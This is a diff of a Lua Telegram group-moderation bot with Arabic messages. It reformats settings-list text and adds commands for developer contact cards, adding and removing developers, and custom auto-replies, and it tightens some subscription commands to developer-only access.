-	 local TXT = "● - `اعدادات المجموعه بالمسح`\nֆ • • • • • • • • • • • • • ֆ\n● - `كل الوسائط` : "..mute_all.."\n"
-	 .."● - `الروابط` : "..mute_links.."\n"
-	 .."● - `التعديل` : "..mute_edit.."\n" 
-	 .."● - `البوتات` : "..mute_bots.."\n"
-	 .."● - `اللغه الانكليزيه` : "..lock_english.."\n"
-	 .."● - `اعاده التوجيه` : "..lock_forward.."\n" 
-	 .."● - `المواقع` : "..lock_wp.."\n" 
-	 .."● - `التثبيت` : "..lock_pin.."\n" 
-	 .."● - `اللغه العربيه` : "..lock_arabic.."\n\n"
-	 .."● - `التاكات` : "..lock_htag.."\n"
-	 .."● - `المعرفات` : "..lock_tag.."\n" 
-	 .."● - `الشبكات` : "..lock_location.."\n" 
-	 .."● - `الاشعارات` : "..lock_tgservice.."\n"
-   .."● - `الكلايش` : "..mute_spam.."\n"
-   .."● - `التكرار بالطرد` : "..mute_flood.."\n" 
-   .."● - `التكرار بالكتم` : "..lock_flood.."\n" 
-   .."● - `التكرار بالمسح` : "..del_flood.."\n" 
-   .."● - `الدردشه` : "..mute_text.."\n\n"
-   .."● - `الصور المتحركه` : "..mute_gifs.."\n"
-   .."● - `الصوتيات` : "..mute_voice.."\n" 
-   .."● - `الاغاني` : "..mute_music.."\n"
-	 .."● - `الانلاين` : "..mute_in.."\n" 
-   .."● - `الملصقات` : "..lock_sticker.."\n"
-	 .."● - `جهات الاتصال` : "..lock_contact.."\n" 
-   .."● - `الفيديوهات` : "..mute_video.."\n● - `الشارحه` : "..lock_cmd.."\n"
-   .."● - `الماركدون` : "..mute_mdd.."\n● - `الملفات` : "..mute_doc.."\n" 
-   .."● - `الصور` : "..mute_photo.."\n"
-   .."● - `الردود` : "..lock_rep.."\n\n"
-   .."ֆ • • • • • • • • • • • • • ֆ\n● - `الترحيب` : "..send_welcome.."\n● - `زمن التكرار` : "..flood_t.."\n"
-   .."● - `عدد التكرار بالطرد` : "..flood_m.."\n"
-   .."● - `عدد التكرار بالكتم` : "..flood_warn.."\n\n"
-   .."● - `عدد التكرار بالمسح` : "..flood_del.."\n"
-   .."● - `عدد الكلايش بالمسح` : "..spam_c.."\n"
-   .."● - `عدد الكلايش بالتحذير` : "..spam_d.."\n"
-   .."● - `انقضاء البوت` : "..exp_dat.." `يوم`\nֆ • • • • • • • • • • • • • ֆ"
+	 local TXT = "• `اعدادات المجموعه بالمسح`\nֆ • • • • • • • • • • • • • ֆ\n• `كل الوسائط` : "..mute_all.."\n"
+	 .."• `الروابط` : "..mute_links.."\n"
+	 .."• `التعديل` : "..mute_edit.."\n" 
+	 .."• `البوتات` : "..mute_bots.."\n"
+	 .."• `اللغه الانكليزيه` : "..lock_english.."\n"
+	 .."• `اعاده التوجيه` : "..lock_forward.."\n" 
+	 .."• `المواقع` : "..lock_wp.."\n" 
+	 .."• `التثبيت` : "..lock_pin.."\n" 
+	 .."• `اللغه العربيه` : "..lock_arabic.."\n\n"
+	 .."• `التاكات` : "..lock_htag.."\n"
+	 .."• `المعرفات` : "..lock_tag.."\n" 
+	 .."• `الشبكات` : "..lock_location.."\n" 
+	 .."• `الاشعارات` : "..lock_tgservice.."\n"
+   .."• `الكلايش` : "..mute_spam.."\n"
+   .."• `التكرار بالطرد` : "..mute_flood.."\n" 
+   .."• `التكرار بالكتم` : "..lock_flood.."\n" 
+   .."• `التكرار بالمسح` : "..del_flood.."\n" 
+   .."• `الدردشه` : "..mute_text.."\n"
+   .."• `الصور المتحركه` : "..mute_gifs.."\n\n"
+   .."• `الصوتيات` : "..mute_voice.."\n" 
+   .."• `الاغاني` : "..mute_music.."\n"
+	 .."• `الانلاين` : "..mute_in.."\n" 
+   .."• `الملصقات` : "..lock_sticker.."\n"
+	 .."• `جهات الاتصال` : "..lock_contact.."\n" 
+   .."• `الفيديوهات` : "..mute_video.."\n• `الشارحه` : "..lock_cmd.."\n"
+   .."• `الماركدون` : "..mute_mdd.."\n• `الملفات` : "..mute_doc.."\n" 
+   .."• `الصور` : "..mute_photo.."\n"
+   .."• `الردود` : "..lock_rep.."\n"
+   .."• `ردود المطور` : "..lock_repsudo.."\n"
+   .."• `الايدي` : "..lock_id.."\n\n"
+   .."ֆ • • • • • • • • • • • • • ֆ\n• `الترحيب` : "..send_welcome.."\n• `زمن التكرار` : "..flood_t.."\n"
+   .."• `عدد التكرار بالطرد` : "..flood_m.."\n"
+   .."• `عدد التكرار بالكتم` : "..flood_warn.."\n\n"
+   .."• `عدد التكرار بالمسح` : "..flood_del.."\n"
+   .."• `عدد الكلايش بالمسح` : "..spam_c.."\n"
+   .."• `عدد الكلايش بالتحذير` : "..spam_d.."\n"
+   .."• `انقضاء البوت` : "..exp_dat.." `يوم`\nֆ • • • • • • • • • • • • • ֆ"
          send(msg.chat_id_, msg.id_, 1, TXT, 1, 'md')
     end
     
@@ -7134,28 +6859,28 @@ end
 				exp_dat = math.floor(ex / 86400) + 1
 			    end
  	------------
-	 local TXT = "● - `اعدادات المجموعه بالتحذير`\nֆ • • • • • • • • • • • • • ֆ\n● - `كل الوسائط` : "..mute_all.."\n"
-	 .."● - `الروابط` : "..mute_links.."\n"
-	 .."● - `الانلاين` : "..mute_in.."\n"
-	 .."● - `التثبيت` : "..lock_pin.."\n"
-	 .."● - `اللغه الانكليزيه` : "..lock_english.."\n"
-	 .."● - `اعاده التوجيه` : "..lock_forward.."\n"
-	 .."● - `اللغه العربيه` : "..lock_arabic.."\n"
-	 .."● - `التاكات` : "..lock_htag.."\n"
-	 .."● - `المعرفات` : "..lock_tag.."\n" 
-	 .."● - `المواقع` : "..lock_wp.."\n"
-	 .."● - `الشبكات` : "..lock_location.."\n" 
-   .."● - `الكلايش` : "..mute_spam.."\n\n" 
-   .."● - `الصور` : "..mute_photo.."\n" 
-   .."● - `الدردشه` : "..mute_text.."\n"
-   .."● - `الصور المتحركه` : "..mute_gifs.."\n"
-   .."● - `الملصقات` : "..lock_sticker.."\n"
-	 .."● - `جهات الاتصال` : "..lock_contact.."\n" 
-   .."● - `الصوتيات` : "..mute_voice.."\n" 
-   .."● - `الاغاني` : "..mute_music.."\n" 
-   .."● - `الفيديوهات` : "..mute_video.."\n● - `الشارحه` : "..lock_cmd.."\n"
-   .."● - `الماركدون` : "..mute_mdd.."\n● - `الملفات` : "..mute_doc.."\n" 
-   .."\n● - `انقضاء البوت` : "..exp_dat.." `يوم`\n" .."ֆ • • • • • • • • • • • • • ֆ"
+	 local TXT = "• `اعدادات المجموعه بالتحذير`\nֆ • • • • • • • • • • • • • ֆ\n• `كل الوسائط` : "..mute_all.."\n"
+	 .."• `الروابط` : "..mute_links.."\n"
+	 .."• `الانلاين` : "..mute_in.."\n"
+	 .."• `التثبيت` : "..lock_pin.."\n"
+	 .."• `اللغه الانكليزيه` : "..lock_english.."\n"
+	 .."• `اعاده التوجيه` : "..lock_forward.."\n"
+	 .."• `اللغه العربيه` : "..lock_arabic.."\n"
+	 .."• `التاكات` : "..lock_htag.."\n"
+	 .."• `المعرفات` : "..lock_tag.."\n" 
+	 .."• `المواقع` : "..lock_wp.."\n"
+	 .."• `الشبكات` : "..lock_location.."\n" 
+   .."• `الكلايش` : "..mute_spam.."\n\n" 
+   .."• `الصور` : "..mute_photo.."\n" 
+   .."• `الدردشه` : "..mute_text.."\n"
+   .."• `الصور المتحركه` : "..mute_gifs.."\n"
+   .."• `الملصقات` : "..lock_sticker.."\n"
+	 .."• `جهات الاتصال` : "..lock_contact.."\n" 
+   .."• `الصوتيات` : "..mute_voice.."\n" 
+   .."• `الاغاني` : "..mute_music.."\n" 
+   .."• `الفيديوهات` : "..mute_video.."\n• `الشارحه` : "..lock_cmd.."\n"
+   .."• `الماركدون` : "..mute_mdd.."\n• `الملفات` : "..mute_doc.."\n" 
+   .."\n• `انقضاء البوت` : "..exp_dat.." `يوم`\n" .."ֆ • • • • • • • • • • • • • ֆ"
          send(msg.chat_id_, msg.id_, 1, TXT, 1, 'md')
     end
     
@@ -7437,30 +7162,238 @@ end
 				exp_dat = math.floor(ex / 86400) + 1
 			    end
  	------------
-	 local TXT = "● - `اعدادات المجموعه بالطرد`\nֆ • • • • • • • • • • • • • ֆ\n● - `كل الوسائط` : "..mute_all.."\n"
-	 .."● - `الروابط` : "..mute_links.."\n" 
-	 .."● - `الانلاين` : "..mute_in.."\n"
-	 .."● - `اللغه الانكليزيه` : "..lock_english.."\n"
-	 .."● - `اعاده التوجيه` : "..lock_forward.."\n" 
-	 .."● - `اللغه العربيه` : "..lock_arabic.."\n"
-	 .."● - `التاكات` : "..lock_htag.."\n"
-	 .."● - `المعرفات` : "..lock_tag.."\n" 
-	 .."● - `المواقع` : "..lock_wp.."\n" 
-	 .."● - `الشبكات` : "..lock_location.."\n\n"
-   .."● - `الصور` : "..mute_photo.."\n" 
-   .."● - `الدردشه` : "..mute_text.."\n" 
-   .."● - `الصور المتحركه` : "..mute_gifs.."\n" 
-   .."● - `الملصقات` : "..lock_sticker.."\n"
-	 .."● - `جهات الاتصال` : "..lock_contact.."\n" 
-   .."● - `الصوتيات` : "..mute_voice.."\n"
-   .."● - `الاغاني` : "..mute_music.."\n"  
-   .."● - `الفيديوهات` : "..mute_video.."\n● - `الشارحه` : "..lock_cmd.."\n"
-   .."● - `الماركدون` : "..mute_mdd.."\n● - `الملفات` : "..mute_doc.."\n" 
-   .."● - `انقضاء البوت` : "..exp_dat.." `يوم`\n" .."ֆ • • • • • • • • • • • • • ֆ"
+	 local TXT = "• `اعدادات المجموعه بالطرد`\nֆ • • • • • • • • • • • • • ֆ\n• `كل الوسائط` : "..mute_all.."\n"
+	 .."• `الروابط` : "..mute_links.."\n" 
+	 .."• `الانلاين` : "..mute_in.."\n"
+	 .."• `اللغه الانكليزيه` : "..lock_english.."\n"
+	 .."• `اعاده التوجيه` : "..lock_forward.."\n" 
+	 .."• `اللغه العربيه` : "..lock_arabic.."\n"
+	 .."• `التاكات` : "..lock_htag.."\n"
+	 .."• `المعرفات` : "..lock_tag.."\n" 
+	 .."• `المواقع` : "..lock_wp.."\n" 
+	 .."• `الشبكات` : "..lock_location.."\n\n"
+   .."• `الصور` : "..mute_photo.."\n" 
+   .."• `الدردشه` : "..mute_text.."\n" 
+   .."• `الصور المتحركه` : "..mute_gifs.."\n" 
+   .."• `الملصقات` : "..lock_sticker.."\n"
+	 .."• `جهات الاتصال` : "..lock_contact.."\n" 
+   .."• `الصوتيات` : "..mute_voice.."\n"
+   .."• `الاغاني` : "..mute_music.."\n"  
+   .."• `الفيديوهات` : "..mute_video.."\n• `الشارحه` : "..lock_cmd.."\n"
+   .."• `الماركدون` : "..mute_mdd.."\n• `الملفات` : "..mute_doc.."\n" 
+   .."• `انقضاء البوت` : "..exp_dat.." `يوم`\n" .."ֆ • • • • • • • • • • • • • ֆ"
          send(msg.chat_id_, msg.id_, 1, TXT, 1, 'md')
     end
      
-    
+  ----------------------------------------------------------------------------------------------- 
+if text:match("^[Dd][Ee][Vv]$")or text:match("^مطور بوت$") or text:match("^مطورين$") or text:match("^مطور البوت$") or text:match("^المطورين$") or text:match("^مطور$") or text:match("^المطور$") and msg.reply_to_message_id_ == 0 then
+local nkeko = redis:get('nmkeko'..bot_id)
+local nakeko = redis:get('nakeko'..bot_id)
+  
+sendContact(msg.chat_id_, msg.id_, 0, 1, nil, (nkeko or 9647707641864), (nakeko or "TshAke TEAM"), "", bot_id)
+end
+  for k,v in pairs(sudo_users) do
+local text = msg.content_.text_:gsub('تغير امر المطور','change ph')
+if text:match("^[Cc][Hh][Aa][Nn][Gg][Ee] [Pp][Hh]$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Now send the_ *developer number*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال رقم المطور` 🗳', 1, 'md')
+end
+redis:set('nkeko'..msg.sender_user_id_..''..bot_id, 'msg')  
+  return false end  
+end
+if text:match("^+(.*)$") then
+local kekoo = redis:get('sudoo'..text..''..bot_id)
+local keko2 = redis:get('nkeko'..msg.sender_user_id_..''..bot_id)
+if keko2 == 'msg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Now send the_ *name of the developer*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال الاسم الذي تريده` 🏷', 1, 'md')
+end
+redis:set('nmkeko'..bot_id, text)  
+redis:set('nkeko'..msg.sender_user_id_..''..bot_id, 'mmsg')  
+  return false end  
+end
+if text:match("^(.*)$") then
+local keko2 = redis:get('nkeko'..msg.sender_user_id_..''..bot_id)
+if keko2 == 'mmsg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Saved Send a_ *DEV to watch the changes*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• `تم حفظ الاسم يمكنك اظهار الجه بـ ارسال امر المطور` ☑️', 1, 'md')
+end
+redis:set('nkeko'..msg.sender_user_id_..''..bot_id, 'no')  
+redis:set('nakeko'..bot_id, text)  
+local nmkeko = redis:get('nmkeko'..bot_id)
+sendContact(msg.chat_id_, msg.id_, 0, 1, nil, nmkeko, text , "", bot_id)
+  return false end  
+end
+  for k,v in pairs(sudo_users) do
+local text = msg.content_.text_:gsub('اضف مطور','add sudo')
+if text:match("^[Aa][Dd][Dd] [Ss][Uu][Dd][Oo]$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send ID_ *Developer*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال ايدي المطور الذي تريد رفعه`💡', 1, 'md')
+end
+redis:set('qkeko'..msg.sender_user_id_..''..bot_id, 'msg')  
+  return false end  
+end
+if text:match("^(%d+)$") then
+local kekoo = redis:get('sudoo'..text..''..bot_id)
+local keko2 = redis:get('qkeko'..msg.sender_user_id_..''..bot_id)
+if keko2 == 'msg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Has been added_ '..text..' *Developer of bot*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• `تم اضافته`  '..text..' `مطور للبوت`☑️', 1, 'md')
+end
+redis:set('sudoo'..text..''..bot_id, 'yes')  
+redis:set('qkeko'..msg.sender_user_id_..''..bot_id, 'no')  
+  return false end  
+end  
+  for k,v in pairs(sudo_users) do
+local text = msg.content_.text_:gsub('حذف مطور','rem sudo')
+if text:match("^[Rr][Ee][Mm] [Ss][Uu][Dd][Oo]$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send ID_ *Developer*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال ايدي المطور الذي تريد حذفه`🗑', 1, 'md')
+end
+redis:set('xkeko'..msg.sender_user_id_..''..bot_id, 'nomsg')  
+  return false end  
+end
+if text:match("^(%d+)$") then
+local keko2 = redis:get('xkeko'..msg.sender_user_id_..''..bot_id)
+if keko2 == 'nomsg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Has been removed_ '..text..' *Developer of bot*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• `تم حذفه`  '..text..' `من مطورين البوت`⚠️', 1, 'md')
+end
+redis:set('xkeko'..msg.sender_user_id_..''..bot_id, 'no')  
+redis:set('sudoo'..text..''..bot_id, 'no')  
+ end  
+end
+
+local text = msg.content_.text_:gsub('اضف رد','add rep')
+if text:match("^[Aa][Dd][Dd] [Rr][Ee][Pp]$") and is_owner(msg.sender_user_id_ , msg.chat_id_) then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send the word_ *you want to add*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• ارسل الكلمه التي تريد اضافتها 📬', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'', 'msg')  
+  return false end  
+if text:match("^(.*)$") then
+if not database:get('bot:rep:mute'..msg.chat_id_) then
+local keko = redis:get('keko'..text..''..bot_id..''..msg.chat_id_..'')
+send(msg.chat_id_, msg.id_, 1, keko, 1, 'md')
+end
+local keko1 = redis:get('keko1'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'')
+if keko1 == 'msg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send the reply_ *you want to add*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• الان ارسل الرد الذي تريد اضافته 📭', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'', 're')  
+redis:set('msg'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'', text)  
+  return false end  
+if keko1 == 're' then
+local keko2 = redis:get('msg'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'')
+redis:set('keko'..keko2..''..bot_id..''..msg.chat_id_..'', text)  
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Saved_', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, "• `تم حفظ الرد` ☑️", 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'', 'no')  
+end
+end  
+
+local text = msg.content_.text_:gsub('حذف رد','rem rep')
+if text:match("^[Rr][Ee][Mm] [Rr][Ee][Pp]$") and is_owner(msg.sender_user_id_ , msg.chat_id_) then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send the word_ *you want to remov*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• ارسل الكلمه التي تريد حذفها 🗑', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'', 'nomsg')  
+  return false end  
+if text:match("^(.*)$") then
+local keko1 = redis:get('keko1'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'')
+if keko1 == 'nomsg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Deleted_', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• تم حذف الرد ⚠️', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id..''..msg.chat_id_..'', 'no')  
+ redis:set('keko'..text..''..bot_id..''..msg.chat_id_..'', " ")  
+ end  
+end
+
+local text = msg.content_.text_:gsub('اضف رد للكل','add rep all')
+if text:match("^[Aa][Dd][Dd] [Rr][Ee][Pp] [Aa][Ll][Ll]$") and is_sudo(msg) then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send the word_ *you want to add*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• ارسل الكلمه التي تريد اضافتها 📬', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id, 'msg')  
+  return false end  
+if text:match("^(.*)$") then
+if not database:get('bot:repsudo:mute'..msg.chat_id_) then
+local keko = redis:get('keko'..text..''..bot_id)
+send(msg.chat_id_, msg.id_, 1, keko, 1, 'md')
+end
+local keko1 = redis:get('keko1'..msg.sender_user_id_..''..bot_id)
+if keko1 == 'msg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send the reply_ *you want to add*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• الان ارسل الرد الذي تريد اضافته 📭', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id, 're')  
+redis:set('msg'..msg.sender_user_id_..''..bot_id, text)  
+  return false end  
+if keko1 == 're' then
+local keko2 = redis:get('msg'..msg.sender_user_id_..''..bot_id)
+redis:set('keko'..keko2..''..bot_id, text)  
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Saved_', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, "• `تم حفظ الرد` ☑️", 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id, 'no')  
+end
+end  
+ 
+local text = msg.content_.text_:gsub('حذف رد للكل','rem rep all')
+if text:match("^[Rr][Ee][Mm] [Rr][Ee][Pp] [Aa][Ll][Ll]$") and is_sudo(msg) then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Send the word_ *you want to remov*', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• ارسل الكلمه التي تريد حذفها 🗑', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id, 'nomsg')  
+  return false end  
+if text:match("^(.*)$") then
+local keko1 = redis:get('keko1'..msg.sender_user_id_..''..bot_id)
+if keko1 == 'nomsg' then
+if database:get('lang:gp:'..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, '_> Deleted_', 1, 'md')
+else
+send(msg.chat_id_, msg.id_, 1, '• تم حذف الرد ⚠️', 1, 'md')
+end
+redis:set('keko1'..msg.sender_user_id_..''..bot_id, 'no')  
+ redis:set('keko'..text..''..bot_id..'', " ")  
+ end  
+end
+
 	-----------------------------------------------------------------------------------------------
           local text = msg.content_.text_:gsub('كرر','echo')
   	if text:match("^echo (.*)$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
@@ -7475,7 +7408,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, "*> Group rules upadted..._", 1, 'md')
    else 
-         send(msg.chat_id_, msg.id_, 1, "● - `تم وضع القوانين للمجموعه` 📍☑️", 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, "• `تم وضع القوانين للمجموعه` 📍☑️", 1, 'md')
 end
     end
 	-----------------------------------------------------------------------------------------------
@@ -7485,13 +7418,13 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Group Rules :*\n'..rules, 1, 'md')
        else 
-         send(msg.chat_id_, msg.id_, 1, '● - `قوانين المجموعه هي  :` ⬇️\n'..rules, 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `قوانين المجموعه هي  :` ⬇️\n'..rules, 1, 'md')
 end
     else
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*rules msg not saved!*', 1, 'md')
        else 
-         send(msg.chat_id_, msg.id_, 1, '● - `لم يتم حفظ قوانين للمجموعه` ⚠️❌', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `لم يتم حفظ قوانين للمجموعه` ⚠️❌', 1, 'md')
 end
 	end
 	end
@@ -7503,7 +7436,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_Group name updated!_\n'..txt[2], 1, 'md')
        else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم تحديث اسم المجموعه الى ✔️⬇️`\n'..txt[2], 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم تحديث اسم المجموعه الى ✔️⬇️`\n'..txt[2], 1, 'md')
          end
     end
 	-----------------------------------------------------------------------------------------------
@@ -7512,7 +7445,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_Please send a photo noew!_', 1, 'md')
 else 
-         send(msg.chat_id_, msg.id_, 1, '● - `قم بارسال صوره الان` ✔️📌', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `قم بارسال صوره الان` ✔️📌', 1, 'md')
 end
     end
 	-----------------------------------------------------------------------------------------------
@@ -7525,7 +7458,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_Group Charged for_ *'..a[2]..'* _Days_', 1, 'md')
 else 
-         send(msg.chat_id_, msg.id_, 1, '● - `تم وضع وقت انتهاء البوت` *'..a[2]..'* `يوم` ⚠️❌', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم وضع وقت انتهاء البوت` *'..a[2]..'* `يوم` ⚠️❌', 1, 'md')
 end
   end
   
@@ -7536,14 +7469,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
 		send(msg.chat_id_, msg.id_, 1, '_No fanil_', 1, 'md')
 else 
-		send(msg.chat_id_, msg.id_, 1, '● - `وقت المجموعه لا نهائي` ☑️', 1, 'md')
+		send(msg.chat_id_, msg.id_, 1, '• `وقت المجموعه لا نهائي` ☑️', 1, 'md')
 end
        else
         local d = math.floor(ex / day ) + 1
                 if database:get('lang:gp:'..msg.chat_id_) then
 	   		send(msg.chat_id_, msg.id_, 1, d.." *Group Days*", 1, 'md')
 else 
-send(msg.chat_id_, msg.id_, 1, "● - `عدد ايام وقت المجموعه` ⬇️\n"..d.." `يوم` 📍", 1, 'md')
+send(msg.chat_id_, msg.id_, 1, "• `عدد ايام وقت المجموعه` ⬇️\n"..d.." `يوم` 📍", 1, 'md')
 end
        end
     end
@@ -7553,10 +7486,10 @@ end
 	local txt = {string.match(text, "^(وقت المجموعه) (-%d+)$")} 
     local ex = database:ttl("bot:charge:"..txt[2])
        if ex == -1 then
-		send(msg.chat_id_, msg.id_, 1, '● - `وقت المجموعه لا نهائي` ☑️', 1, 'md')
+		send(msg.chat_id_, msg.id_, 1, '• `وقت المجموعه لا نهائي` ☑️', 1, 'md')
        else
         local d = math.floor(ex / day ) + 1
-send(msg.chat_id_, msg.id_, 1, "● - `عدد ايام وقت المجموعه` ⬇️\n"..d.." `يوم` 📍", 1, 'md')
+send(msg.chat_id_, msg.id_, 1, "• `عدد ايام وقت المجموعه` ⬇️\n"..d.." `يوم` 📍", 1, 'md')
        end
     end
     
@@ -7582,24 +7515,24 @@ send(msg.chat_id_, msg.id_, 1, "● - `عدد ايام وقت المجموعه` 
   
   if text:match("^مغادره (-%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
   	local txt = {string.match(text, "^(مغادره) (-%d+)$")} 
-	   send(msg.chat_id_, msg.id_, 1, '● - `المجموعه` '..txt[2]..' `تم الخروج منها` ☑️📍', 1, 'md')
-	   send(txt[2], 0, 1, '● - `هذه ليست ضمن المجموعات الخاصة بي` ⚠️❌', 1, 'md')
+	   send(msg.chat_id_, msg.id_, 1, '• `المجموعه` '..txt[2]..' `تم الخروج منها` ☑️📍', 1, 'md')
+	   send(txt[2], 0, 1, '• `هذه ليست ضمن المجموعات الخاصة بي` ⚠️❌', 1, 'md')
 	   chat_leave(txt[2], bot_id)
   end
   -----------------------------------------------------------------------------------------------
-  if text:match('^المده1 (-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
+  if text:match('^المده1 (-%d+)$') and is_sudo(msg) then
        local txt = {string.match(text, "^(المده1) (-%d+)$")} 
        local timeplan1 = 2592000
        database:setex("bot:charge:"..txt[2],timeplan1,true)
-	   send(msg.chat_id_, msg.id_, 1, '● - `المجموعه` '..txt[2]..' `تم اعادة تفعيلها المدة 30 يوم ☑️📍`', 1, 'md')
-	   send(txt[2], 0, 1, '● - `تم تفعيل مدة المجموعه 30 يوم` ✔️📌', 1, 'md')
+	   send(msg.chat_id_, msg.id_, 1, '• `المجموعه` '..txt[2]..' `تم اعادة تفعيلها المدة 30 يوم ☑️📍`', 1, 'md')
+	   send(txt[2], 0, 1, '• `تم تفعيل مدة المجموعه 30 يوم` ✔️📌', 1, 'md')
 	   for k,v in pairs(sudo_users) do
-            send(v, 0, 1, "● - `قام بتفعيل مجموعه المده كانت 30 يوم ☑️` : \n● - `ايدي المطور 📍` : "..msg.sender_user_id_.."\n● - `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n● - `معلومات المجموعه 👥` :\n\n● - `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n● - `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
+            send(v, 0, 1, "• `قام بتفعيل مجموعه المده كانت 30 يوم ☑️` : \n• `ايدي المطور 📍` : "..msg.sender_user_id_.."\n• `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n• `معلومات المجموعه 👥` :\n\n• `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n• `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
        end
 	   database:set("bot:enable:"..txt[2],true)
   end
   -----------------------------------------------------------------------------------------------
-  if text:match('^[Pp][Ll][Aa][Nn]1 (-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
+  if text:match('^[Pp][Ll][Aa][Nn]1 (-%d+)$') and is_sudo(msg) then
        local txt = {string.match(text, "^([Pp][Ll][Aa][Nn]1) (-%d+)$")} 
        local timeplan1 = 2592000
        database:setex("bot:charge:"..txt[2],timeplan1,true)
@@ -7611,19 +7544,19 @@ send(msg.chat_id_, msg.id_, 1, "● - `عدد ايام وقت المجموعه` 
 	   database:set("bot:enable:"..txt[2],true)
   end
   -----------------------------------------------------------------------------------------------
-  if text:match('^المده2 (-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
+  if text:match('^المده2 (-%d+)$') and is_sudo(msg) then
        local txt = {string.match(text, "^(المده2) (-%d+)$")} 
        local timeplan2 = 7776000
        database:setex("bot:charge:"..txt[2],timeplan2,true)
-	   send(msg.chat_id_, msg.id_, 1, '● - `المجموعه` '..txt[2]..' `تم اعادة تفعيلها المدة 90 يوم ☑️📍`', 1, 'md')
